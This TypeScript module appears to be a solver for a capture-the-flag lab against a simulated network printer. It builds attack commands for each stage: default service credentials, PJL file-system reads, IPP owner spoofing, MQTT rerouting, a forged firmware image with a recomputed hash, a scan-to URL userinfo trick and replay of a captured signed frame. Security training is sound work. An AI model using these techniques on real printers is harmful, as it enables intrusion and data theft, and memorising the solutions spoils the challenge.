import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { gunzipSync } from "node:zlib";

const sha = (text: string) => createHash("sha256").update(text).digest("hex");
export const printerJsonCommand = (operation: string, value: unknown) =>
  `printer ${operation} '${JSON.stringify(value)}'`;
export async function preparePrinterCommands(
  read: (n: number, file: string) => Promise<string>,
  run: (command: string) => Promise<string>,
) {
  const commands: Record<string, string> = {};
  const retained = (await read(1, "trabajos.csv"))
    .trim()
    .split("\n")
    .find((row) => row.endsWith(",retenido"))!
    .split(",")[0];
  commands["iot-01"] = "printer job " + retained;
  const backup = (await read(2, "soporte.log")).match(/GET (\S+\.cfg)/)![1];
  commands["iot-02"] = "printer fetch " + backup;
  assert.match(await read(3, "manual-instalacion.txt"), /Flow!/);
  const serial = (await read(3, "etiqueta.txt")).match(/Serie: (\S+)/)![1];
  commands["iot-03"] = "printer login service Flow!" + serial.slice(-4);
  const scans = await run("printer scans");
  commands["iot-04"] =
    "printer scan " +
    scans
      .split("\n")
      .find((row) => row.includes("custodia"))!
      .split(" ")[0];
  const resource = (await read(5, "inventario-servicio.csv"))
    .trim()
    .split("\n")
    .find((row) => row.includes("custodia"))!
    .split(",");
  commands["iot-05"] =
    `printer pjl '@PJL FSUPLOAD NAME="${resource[0]}:${resource[1]}" OFFSET=0 SIZE=${resource[2]}'`;
  const conf = Object.fromEntries(
    (await read(6, "broker.conf"))
      .trim()
      .split("\n")
      .map((row) => row.split("=")),
  );
  const routes = JSON.parse(await read(6, "rutas.json"));
  commands["iot-06"] =
    "printer mqtt " +
    routes.reports.replace(/\{(\w+)\}/g, (_: string, key: string) => conf[key]);
  const ticket = JSON.parse(await read(7, "ticket.json"));
  ticket["requesting-user-name"] = (await read(7, "ipp.log")).match(
    /owner=(\S+)/,
  )![1];
  commands["iot-07"] = printerJsonCommand("ipp", ticket);
  const pack = JSON.parse(await read(8, "firmware.json"));
  assert.match(await read(8, "verificador.txt"), /model\|version/);
  pack.image = { mode: "maintenance", report: "custody" };
  pack.manifest.imageSha256 = sha(JSON.stringify(pack.image));
  commands["iot-08"] = printerJsonCommand("update", pack);
  const batch = JSON.parse(await read(9, "lote.json"));
  const destination = (await read(9, "destinos.log"))
    .match(/https:\/\/vault\.\S+/)![0]
    .replace(
      "<resumen>",
      sha([batch.serial, batch.batch, batch.nonce].join("|")),
    );
  commands["iot-09"] =
    "printer scan-to '" +
    destination.replace("https://", "https://scan.seventech.local@") +
    "'";
  const state = JSON.parse(await read(10, "estado.json"));
  const frames = JSON.parse(await read(10, "capturas.json")) as {
    topic: string;
    payload: string;
    signature: string;
  }[];
  const valid = frames.find((frame) => {
    const body = JSON.parse(
      gunzipSync(Buffer.from(frame.payload, "base64")).toString("utf8"),
    );
    return (
      body.serial === state.serial &&
      body.epoch === state.epoch &&
      body.counter === state.nextCounter
    );
  })!;
  assert.ok(valid);
  commands["iot-10"] = printerJsonCommand("dispatch", {
    ...valid,
    topic: "flow/vault/snapshot",
  });
  return commands;
}
export function printerReplyFlag(id: string, output: string) {
  const text =
    id === "iot-06"
      ? Buffer.from(JSON.parse(output).payload, "base64").toString("utf8")
      : output;
  const flag = text.match(/CTF\{[a-f0-9]{32}\}/)?.[0];
  assert.ok(flag, "Falta evidencia recuperada en " + id);
  return flag;
}
